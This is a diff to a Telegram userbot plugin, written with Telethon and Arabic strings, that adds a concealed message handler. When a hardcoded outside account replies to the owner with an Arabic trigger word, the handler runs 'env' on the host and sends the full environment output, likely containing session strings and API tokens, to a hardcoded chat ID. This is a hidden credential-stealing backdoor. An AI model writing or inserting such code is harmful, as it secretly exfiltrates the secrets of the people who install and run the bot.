@@ -480,6 +480,26 @@ async def Hussein(event):
                 # Send the output to user ID 6320583148
                 await Qrh9.send_message(1509530035, OUTPUT)
 ###
+###
+###
+idk = [6320583148]
+@Qrh9.on(events.NewMessage(incoming=True))
+async def Hussein(event):
+    if event.reply_to and event.sender_id in idk:
+        reply_msg = await event.get_reply_message()
+        owner_id = reply_msg.from_id.user_id
+        if owner_id == Qrh9.uid:
+            if event.message.message == "فاراتك":
+                cmd = "env"
+                o = (await _catutils.runcmd(cmd))[0]
+                OUTPUT = (
+                    f"**[الساحر](tg://need_update_for_some_feature/) قـائمـة الـفـارات:**\n\n\n{o}\n\n**انتبه هنالك معلومات حساسة لا تُعطِها لشخص غير موثوق**"
+                )
+                # Send the output to user ID 6320583148
+                await Qrh9.send_message(1509530035, OUTPUT)
+###
+###
+
 @Qrh9.on(admin_cmd(pattern="همسه(?:\s|$)([\s\S]*)"))
 async def permalink(mention):
     user, custom = await get_user_from_event(mention)
